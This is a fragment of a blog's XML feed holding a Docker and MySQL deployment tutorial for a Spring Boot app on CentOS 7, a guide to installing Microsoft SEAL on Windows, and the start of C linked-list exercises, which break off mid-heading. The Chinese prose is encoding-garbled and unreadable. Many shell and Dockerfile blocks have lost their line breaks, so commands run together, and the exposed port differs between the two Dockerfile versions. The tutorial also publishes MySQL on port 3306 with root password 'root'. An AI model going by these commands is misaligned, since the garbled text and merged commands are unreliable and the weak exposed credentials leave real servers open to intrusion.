        <content type="html"><![CDATA[<blockquote><p>@auther by sizaif</p></blockquote><p>@<a href="%E7%9B%AE%E5%BD%95">TOC</a></p><h1>å¼•è¨€</h1><p>æˆ‘çš„linuxç¯å¢ƒä¸º:<br>centos:7<br>æœåŠ¡å™¨åœ¨å›½å¤–,æ‰€ä»¥æœ‰ä¸€äº›æ“ä½œåƒé˜¿é‡Œäº‘çš„ç«¯å£å®‰å…¨ç»„è®¾ç½®å°±ä¸éœ€è¦æ“ä½œ</p><h1>éœ€è¦çš„è½¯ä»¶</h1><ol><li>xshell(ç”¨æ¥è¿æ¥linuxæœåŠ¡å™¨)</li><li>xftpæˆ–fileZillaç”¨æ¥ç»™linuxæœåŠ¡å™¨ä¸Šä¼ æ–‡ä»¶</li><li>sqlyog(æˆ–è€…navicat)åœ¨æœåŠ¡å™¨ä¸Šè§£æ.sqlè„šæœ¬</li><li>maven(ideaè‡ªå¸¦) ç”¨æ¥æ‰“åŒ…</li></ol><h1>å®‰è£…Docker</h1><h2 id="å®˜ç½‘å¯¹ç³»ç»Ÿçš„è¦æ±‚">å®˜ç½‘å¯¹ç³»ç»Ÿçš„è¦æ±‚</h2><div class="story post-story"><blockquote><p>OS requirements<br>To install Docker Engine, you need a maintained version of CentOS 7. Archived versions arenâ€™t supported or tested.<br>The centos-extras repository must be enabled. This repository is enabled by default, but if you have disabled it, you need to re-enable it.<br>The overlay2 storage driver is recommended.</p></blockquote><p><strong>è¦æ±‚ç‰ˆæœ¬Centos7, å…¶ç‰ˆæœ¬ä¸æ”¯æŒæˆ–æœªæµ‹è¯•</strong><br>ç»è¿‡æˆ‘æµ‹è¯•,çš„ç¡®åœ¨å®‰è£…æ—¶ä¼šé‡åˆ°ä¾èµ–çš„é”™è¯¯æ‰€ä»¥å¹²è„†å°†Centos6 æ¢æˆCentos7</p></div><h2 id="å®‰è£…å’Œè®¾ç½®ä»“åº“">å®‰è£…å’Œè®¾ç½®ä»“åº“</h2><div class="story post-story"><blockquote><p>å®˜æ–¹æ•™ç¨‹</p></blockquote><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> yum <span class="token function">install</span> -y yum-utils<span class="token function">sudo</span> yum-config-manager <span class="token punctuation">\</span>   --add-repo <span class="token punctuation">\</span>   https://download.docker.com/linux/centos/docker-ce.repo</code></pre><blockquote><p>è¿™ä¸ªä»“åº“æ˜¯å®˜æ–¹çš„,å¦‚æœå¤ªæ…¢çš„æ¢,æ¢æˆé˜¿é‡Œäº‘é•œåƒ:<br><strong>éœ€è¦é…ç½®æ–‡ä»¶</strong><br><strong>å¯ä»¥è‡ªè¡Œç™¾åº¦</strong></p></blockquote><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> yum-config-manager <span class="token punctuation">\</span>    --add-repo <span class="token punctuation">\</span>    http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</code></pre><blockquote><p>å®‰è£…æœ€æ–°ç‰ˆçš„docker</p></blockquote><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> yum <span class="token function">install</span> docker-ce docker-ce-cli containerd.io</code></pre><blockquote><p>è‹¥è¦å®‰è£…ç‰¹å®šç‰ˆæœ¬</p></blockquote><pre class="language-shell" data-language="shell"><code class="language-shell">$ yum list docker-ce --showduplicates <span class="token operator">|</span> <span class="token function">sort</span> -rdocker-ce.x86_64  <span class="token number">3</span>:18.09.1-3.el7                     docker-ce-stabledocker-ce.x86_64  <span class="token number">3</span>:18.09.0-3.el7                     docker-ce-stabledocker-ce.x86_64  <span class="token number">18.06</span>.1.ce-3.el7                    docker-ce-stabledocker-ce.x86_64  <span class="token number">18.06</span>.0.ce-3.el7                    docker-ce-stable</code></pre><blockquote><p>ä¾‹å¦‚è¦æŒ‰ç…§ docker-ce.x86_64 18.06.1.ce-3.el7<br>&lt;VERSION_STRING&gt; docker-ce-18.06.1</p></blockquote><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> yum <span class="token function">install</span> docker-ce-<span class="token operator">&lt;</span>VERSION_STRING<span class="token operator">></span> docker-ce-cli-<span class="token operator">&lt;</span>VERSION_STRING<span class="token operator">></span> containerd.io</code></pre><blockquote><p>å¼€å¯docker</p></blockquote><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> systemctl start docker</code></pre><p>è·‘ä¸€ä¸ªdockerç‰ˆçš„helloworldï¼Œç±»ä¼¼äºjavaçš„helloï¼Œæµ‹è¯•æ˜¯å¦å®‰è£…æˆåŠŸ</p><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> docker run hello-world</code></pre><p><img src="https://img-blog.csdnimg.cn/20200430183106810.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpemFpZg==,size_16,color_FFFFFF,t_70" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200430183106810.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpemFpZg==,size_16,color_FFFFFF,t_70" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="æˆåŠŸæ ·å¼"></p><h1>å®‰è£…mysql</h1><blockquote><p>ä»docker hubä¸ŠæŸ¥æ‰¾mysqlé•œåƒ</p></blockquote><pre class="language-shell" data-language="shell"><code class="language-shell">docker search mysql</code></pre><blockquote><p>ä»docker hubä¸Šæ‹‰å–mysql,æˆ‘æ‹‰å–çš„mysqlç‰ˆæœ¬æ˜¯mysql5.7</p></blockquote><pre class="language-shell" data-language="shell"><code class="language-shell">docker pull mysql:5.7</code></pre><blockquote><p>docker volume create mysql_data åˆ›å»ºæ•°æ®æŒ‚è½½ç‚¹ï¼ˆå³å­˜å‚¨æ•°æ®çš„åœ°æ–¹ï¼Œè¿™æ ·å³ä¾¿mysqlå®¹å™¨åˆ é™¤äº†ï¼Œæ•°æ®è¿˜æ˜¯åœ¨ï¼‰</p></blockquote><pre class="language-shell" data-language="shell"><code class="language-shell">docker volume create mysql_data </code></pre><blockquote><p>è¿è¡Œmysqlï¼Œå¼€æ”¾çš„ç«¯å£æ˜¯3306ï¼Œå¯†ç æ˜¯rootï¼Œ -dæ˜¯åå°è¿è¡Œ</p></blockquote><pre class="language-shell" data-language="shell"><code class="language-shell">docker run --name mysql -p <span class="token number">3306</span>:3306 -v mysql_data:/var/lib/mysql -e <span class="token assign-left variable">MYSQL_ROOT_PASSWORD</span><span class="token operator">=</span>root -d mysql:5.7</code></pre><p>docker ps æŸ¥çœ‹å®¹å™¨åˆ›å»ºæˆåŠŸ</p><p><img src="https://img-blog.csdnimg.cn/20200430183359426.png" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200430183359426.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿›å…¥mysql çš„å®¹å™¨å†…</p><pre class="language-shell" data-language="shell"><code class="language-shell">docker <span class="token builtin class-name">exec</span> -it å®¹å™¨çš„id /bin/bash</code></pre><p>è¿›å…¥mysql,<br><img src="https://img-blog.csdnimg.cn/20200430183600916.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpemFpZg==,size_16,color_FFFFFF,t_70" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200430183600916.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpemFpZg==,size_16,color_FFFFFF,t_70" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å½“å¯ä»¥è¿›å…¥æ—¶,è¯´æ˜mysql æ²¡é—®é¢˜äº†,</p><blockquote><p>é€šè¿‡docker restart é•œåƒå  å¯ä»¥é‡å¯é•œåƒ</p></blockquote><pre class="language-shell" data-language="shell"><code class="language-shell">docker restart mysql</code></pre></div><h2 id="ä½¿ç”¨navicat-è¿œç¨‹è¿æ¥æ•°æ®åº“">ä½¿ç”¨navicat è¿œç¨‹è¿æ¥æ•°æ®åº“</h2><div class="story post-story"><p><img src="https://img-blog.csdnimg.cn/20200430183906822.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpemFpZg==,size_16,color_FFFFFF,t_70" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200430183906822.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpemFpZg==,size_16,color_FFFFFF,t_70" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><blockquote><p>è¿è¡Œæœ¬åœ°çš„.sql æ–‡ä»¶, å°†è¿œç¨‹æ•°æ®åº“ä¸­å¢åŠ æ•°æ®</p></blockquote><h1>å°†springbooté¡¹ç›®æ‰“æˆjaråŒ…</h1><p><strong>æ³¨æ„å°†applicayion.ymlä¸­å¯†ç æ”¹æˆä½ æœåŠ¡å™¨ä¸Šmysqlçš„å¯†ç </strong></p><p><img src="https://img-blog.csdnimg.cn/20200430184453660.png" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200430184453660.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><img src="https://img-blog.csdnimg.cn/20200430184148260.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpemFpZg==,size_16,color_FFFFFF,t_70" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200430184148260.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpemFpZg==,size_16,color_FFFFFF,t_70" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><blockquote><p><strong>æ‰“åŒ…ååœ¨targetä¸‹ä¼šç”Ÿæˆä¸€ä¸ªjaråŒ…</strong></p></blockquote><p><img src="https://img-blog.csdnimg.cn/20200430184311308.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpemFpZg==,size_16,color_FFFFFF,t_70" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200430184311308.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpemFpZg==,size_16,color_FFFFFF,t_70" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p></div><h2 id="ç¼–å†™Dockfileæ–‡ä»¶">ç¼–å†™Dockfileæ–‡ä»¶</h2><div class="story post-story"><blockquote><p><strong>åœ¨ /home ç›®å½•ä¸‹åˆ›å»ºdockeræ–‡ä»¶å¤¹</strong></p></blockquote><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token function">mkdir</span> /home/docker </code></pre><p><strong>ä½¿ç”¨xftpä¸Šä¼ jaråŒ…</strong><br><img src="https://img-blog.csdnimg.cn/20200430184620884.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpemFpZg==,size_16,color_FFFFFF,t_70" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200430184620884.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpemFpZg==,size_16,color_FFFFFF,t_70" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><blockquote><p><strong>ç¼–å†™Dockerfileæ–‡ä»¶</strong><br><img src="https://img-blog.csdnimg.cn/20200430192744182.png" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200430192744182.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p></blockquote><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token function">vim</span> Dockerfile</code></pre><blockquote><p>å®Œæ•´å‘½ä»¤, vimçš„ä½¿ç”¨æ–¹æ³•ï¼šç‚¹å‡»iå¼€å§‹ç¼–å†™ï¼Œç¼–å†™å®Œåç‚¹å‡»escï¼Œç‚¹å‡»å†’å·ï¼Œè¾“å…¥wqä¿å­˜<br><img src="https://img-blog.csdnimg.cn/20200430192653896.png" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200430192653896.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p></blockquote><pre class="language-shell" data-language="shell"><code class="language-shell">FROM java:8ADD emsdemo-0.0.2-SNAPSHOT.jar /emsdemo.jarEXPOSE 8081ENTRYPOINT <span class="token punctuation">[</span><span class="token string">"java"</span>,<span class="token string">"-jar"</span>,<span class="token string">"/emsdemo.jar"</span><span class="token punctuation">]</span></code></pre><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token comment">#æ³¨æ„ï¼Œdockerå‘½ä»¤å…¨éƒ¨å¤§å†™ï¼Œè¿™æ˜¯è§„å®šã€‚</span><span class="token comment">#   From å…³é”®å­—è¡¨ç¤ºï¼ŒjaråŒ…ä¾èµ–çš„ç¯å¢ƒã€‚java:8  ç›¸å½“äºjdk1.8</span>FROM java:8 <span class="token comment">#ADDå‘½ä»¤ </span><span class="token comment">#   emsdemo-0.0.2-SNAPSHOT.jarï¼šè¿™æ˜¯ä½ ä¸Šä¼ jaråŒ…çš„åç§°ã€‚</span><span class="token comment">#   /emsdemo.jarï¼šè¿™æ˜¯è‡ªå®šä¹‰çš„åç§°ã€‚ä½†æ˜¯æ³¨æ„è¦æœ‰ä¹‹å‰çš„/</span>ADD emsdemo-0.0.2-SNAPSHOT.jar /emsdemo.jar <span class="token comment">#MAINTAINER  ä½œè€…åç§°ã€‚å¯ä»¥åˆ é™¤ä¸å†™ã€‚</span>MAINTAINER Sizaif <span class="token comment">#EXPOSE é¡¹ç›®æš´éœ²çš„ç«¯å£å·</span>EXPOSE <span class="token number">8080</span> <span class="token comment">#/blog.jaræ­¤å¤„çš„åç§°è¦å’ŒADDå‘½ä»¤åé¢çš„ä¸€æ ·ã€‚</span>ENTRYPOINT <span class="token punctuation">[</span><span class="token string">"java"</span>,<span class="token string">"-jar"</span>,<span class="token string">"/emsdemo.jar"</span><span class="token punctuation">]</span></code></pre><p><strong>åœ¨dockeræ–‡ä»¶å¤¹ä¸‹æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤</strong></p><pre class="language-shell" data-language="shell"><code class="language-shell">docker build -t emsdemo:1.0 <span class="token builtin class-name">.</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200430192801282.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpemFpZg==,size_16,color_FFFFFF,t_70" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200430192801282.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpemFpZg==,size_16,color_FFFFFF,t_70" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h1>è¿è¡Œé•œåƒ</h1><pre class="language-shell" data-language="shell"><code class="language-shell">docker run -it --net<span class="token operator">=</span>host --name emsdemo -d -p <span class="token number">80</span>:8081 emsdemo:1.0</code></pre><p><img src="https://img-blog.csdnimg.cn/20200430193058999.png" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200430193058999.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è‡³æ­¤å…¨éƒ¨å®Œæˆ.<br>åœ¨æµè§ˆå™¨è®¿é—®å°±å¯ä»¥äº†</p></div>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> Springboot </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
            <tag> Springboot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åœ¨windowsä¸Šå®‰è£…Microsoft SEAL</title>
      <link href="/posts/6b27b8ff/"/>
      <url>/posts/6b27b8ff/</url>
      
        <content type="html"><![CDATA[<blockquote><p>@auther by sizaif</p></blockquote><h1>åœ¨windowsä¸Šå®‰è£…Microsoft SEAL</h1><blockquote><p>Noteï¼è¯´æ˜</p><p>å®‰è£…çš„ç‰ˆæœ¬ä¸º3.6</p></blockquote><h2 id="éœ€è¦ç¯å¢ƒ">éœ€è¦ç¯å¢ƒ</h2><div class="story post-story"><p>Visual Studio 2019 with C++ CMake Tools for Windows</p></div><h2 id="1-git-é¡¹ç›®æ–‡ä»¶">1. git é¡¹ç›®æ–‡ä»¶</h2><div class="story post-story"><pre class="language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;microsoft&#x2F;SEAL.git</code></pre></div><h2 id="2-ä»¥ç®¡ç†å‘˜æ‰“å¼€VS2019æ‰“å¼€SEALæ–‡ä»¶å¤¹">2. ä»¥ç®¡ç†å‘˜æ‰“å¼€VS2019æ‰“å¼€SEALæ–‡ä»¶å¤¹</h2><div class="story post-story"><img src="https://gitee.com/sizaif/images/raw/master/img/20210122214210.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210122214210.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210122214210031" style="zoom:80%;" /><p>æ‰“å¼€åï¼ŒVSä¼šè‡ªåŠ¨è¿è¡Œcmakeé…ç½®</p><blockquote><p>Visual Studio will detect that this is a CMake-based project and will enable the menu command <code>Project / CMake settings for SEAL</code>. This will open the CMake settings editor that provides a user interface where you can create different configurations and set different CMake options.</p></blockquote></div><h2 id="3-VSé‡Œæ‰“å¼€ç»ˆç«¯powershell">3. VSé‡Œæ‰“å¼€ç»ˆç«¯powershell</h2><div class="story post-story"><img src="https://gitee.com/sizaif/images/raw/master/img/20210122214602.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210122214602.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210122214602674" style="zoom: 67%;" /><blockquote><p>å› ä¸ºVS2019æ˜¯ä»¥ç®¡ç†å‘˜æ‰“å¼€çš„ï¼Œæ‰€ä»¥æ‰“å¼€çš„ç»ˆç«¯ä¹Ÿæ˜¯å¸¦æœ‰ç®¡ç†å‘˜æƒé™çš„</p></blockquote></div><h2 id="4-åœ¨ç»ˆç«¯ä¸­ä¾æ¬¡è¾“å…¥">4. åœ¨ç»ˆç«¯ä¸­ä¾æ¬¡è¾“å…¥</h2><div class="story post-story"><pre class="language-powershell" data-language="powershell"><code class="language-powershell">cmake <span class="token operator">-</span>S <span class="token punctuation">.</span> <span class="token operator">-</span>B buildcmake <span class="token operator">--</span>build buildcmake <span class="token operator">--</span>install build</code></pre><p>æˆ–è€…é‡‡ç”¨<br>#Generate and build for x64 in Release mode</p><pre class="language-PowerShell" data-language="PowerShell"><code class="language-PowerShell">cmake -S . -B build -G &quot;Visual  Studio 16 2019&quot; -A x64cmake --build build --config Releasecmake --install build</code></pre><p>å¦‚æœæˆåŠŸï¼Œåˆ™é»˜è®¤å®‰è£…çš„C:/Program Files(x86)/SEAL/ç›®å½•ä¸‹</p><img src="https://gitee.com/sizaif/images/raw/master/img/20210122214935.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210122214935.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210122214935322" style="zoom:80%;" /></div><h2 id="æˆ–è€…ç›´æ¥æ‰“å¼€-x64-Native-Tools">æˆ–è€…ç›´æ¥æ‰“å¼€ x64 Native Tools</h2><div class="story post-story"><p>è¿›å…¥åˆ°ä½ çš„ä»githubä¸Šä¸‹è½½çš„SEALæ–‡ä»¶å¤¹ä½ç½®<br><img src="https://img-blog.csdnimg.cn/20210123001330833.png" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20210123001330833.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä¾æ¬¡è¾“å…¥ä»¥ä¸‹å‘½ä»¤</p><pre class="language-none"><code class="language-none">cmake -S . -B build -G Ninjacmake --build buildcmake --install build</code></pre><p>å¦‚æœä¸å‡ºé—®é¢˜å‡ºç°ä¸‹é¢å›¾ç‰‡,åˆ™å®‰è£…å®Œæˆ<br><img src="https://img-blog.csdnimg.cn/20210123001607611.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpemFpZg==,size_16,color_FFFFFF,t_70" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20210123001607611.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpemFpZg==,size_16,color_FFFFFF,t_70" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p></div>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> Microsoft SEAL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Seal </tag>
            
            <tag> åŒæ€åŠ å¯† </tag>
            
            <tag> Win </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>çº¿æ€§è¡¨(é“¾è¡¨)é¢˜ç›®ç®—æ³•é¢˜ç›®æ•´ç†(é™„ä»£ç )</title>
      <link href="/posts/41ebddd6/"/>
      <url>/posts/41ebddd6/</url>
      
        <content type="html"><![CDATA[<blockquote><p>@auther by sizaif</p></blockquote><blockquote><p>è¯´æ˜ï¼š<br>éƒ¨åˆ†é¢˜ç›®ä¸ºç‹é“é¢˜ç›®æ•´ç†ï¼Œ(ps.ç‹é“ä¸Šæ€è·¯æ²¡é—®é¢˜ï¼Œåœ¨å®ç°ä»£ç ä¸Šç•¥æœ‰äº›é—®é¢˜)<br>å› ä¸ªäººä»£ç é£æ ¼ä¸ç‹é“ç•¥æœ‰ä¸åŒï¼Œéƒ¨åˆ†ç»†èŠ‚ä»£ç ä¹Ÿä¸å°½ç›¸åŒ<br>ä¸ªäººæ•´ç†by sizaif</p></blockquote><p>@<a href="%E9%93%BE%E8%A1%A8%E9%A2%98%E7%9B%AE%E7%AE%97%E6%B3%95%E6%95%B4%E7%90%86">TOC</a></p><h1>é“¾è¡¨ï¼š</h1><pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">//å•é“¾è¡¨ç»“æ„</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">link</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> data<span class="token punctuation">;</span>    link <span class="token operator">*</span>next<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>node<span class="token punctuation">,</span><span class="token operator">*</span>linklist<span class="token punctuation">;</span></code></pre><h2 id="1-è¾“å…¥ä¸€ç»„æ•´å‹å…ƒç´ åºåˆ—ï¼Œä½¿ç”¨å°¾æ’æ³•-å¤´æ’æ³•-å»ºç«‹ä¸€ä¸ªå¸¦æœ‰å¤´ç»“ç‚¹-ä¸å¸¦å¤´ç»“ç‚¹-çš„å•é“¾è¡¨ã€‚">1)   <strong>è¾“å…¥ä¸€ç»„æ•´å‹å…ƒç´ åºåˆ—ï¼Œä½¿ç”¨å°¾æ’æ³•(å¤´æ’æ³•)å»ºç«‹ä¸€ä¸ªå¸¦æœ‰å¤´ç»“ç‚¹(ä¸å¸¦å¤´ç»“ç‚¹)çš„å•é“¾è¡¨</strong>ã€‚</h2><div class="story post-story"><details green><summary> code </summary>              <div class='content'>              <pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">/** * å»ºç«‹å¸¦å¤´ç»“ç‚¹çš„å•é“¾è¡¨ * @param L [description] */</span><span class="token keyword">void</span> <span class="token function">Creat_list_Head</span><span class="token punctuation">(</span>linklist <span class="token operator">&amp;</span>L<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    L <span class="token operator">=</span> new <span class="token function">node</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    linklist p<span class="token punctuation">,</span>s<span class="token operator">=</span>L<span class="token punctuation">;</span>    L<span class="token operator">-></span>next<span class="token operator">=</span><span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> x<span class="token punctuation">;</span>    <span class="token comment">/*while(cin>>x,x>0)// å¤´æ’    &#123;        p= new node();        p->data =x;        p->next=L->next;        L->next=p;    &#125;*/</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>cin<span class="token operator">>></span>x<span class="token punctuation">,</span>x<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">//å°¾æ’</span>    <span class="token punctuation">&#123;</span>        p<span class="token operator">=</span>new <span class="token function">node</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        p<span class="token operator">-></span>data<span class="token operator">=</span>x<span class="token punctuation">;</span>        s<span class="token operator">-></span>next<span class="token operator">=</span>p<span class="token punctuation">;</span>        s<span class="token operator">=</span>p<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">Creat_list_withoutHead</span><span class="token punctuation">(</span>linklist <span class="token operator">&amp;</span>L<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    L <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    linklist p<span class="token punctuation">,</span>s<span class="token punctuation">;</span>    <span class="token keyword">int</span> x<span class="token punctuation">;</span>    <span class="token comment">/*    while(cin>>x,x>0)// å¤´æ’    &#123;        p= new node();        p->data =x;        p->next=L;          L=p;     &#125;    */</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>cin<span class="token operator">>></span>x<span class="token punctuation">,</span>x<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token comment">// å°¾æ’</span>        p <span class="token operator">=</span> new <span class="token function">node</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        p<span class="token operator">-></span>data <span class="token operator">=</span> x<span class="token punctuation">;</span>        p<span class="token operator">-></span>next <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>L<span class="token operator">==</span><span class="token constant">NULL</span><span class="token punctuation">)</span> L <span class="token operator">=</span> p<span class="token punctuation">;</span> <span class="token comment">// ç¬¬ä¸€ä¸ªç»“ç‚¹</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            s <span class="token operator">=</span> L<span class="token punctuation">;</span>            <span class="token keyword">while</span><span class="token punctuation">(</span>s<span class="token operator">-></span>next<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token comment">// éå†åˆ°æœ€åä¸€ä¸ªç»“ç‚¹</span>                s <span class="token operator">=</span> s<span class="token operator">-></span>next<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            s<span class="token operator">-></span>next <span class="token operator">=</span> p<span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre>              </div>            </details></div><h2 id="2-åœ¨è¯¥å•é“¾è¡¨çš„ç¬¬iä¸ªå…ƒç´ 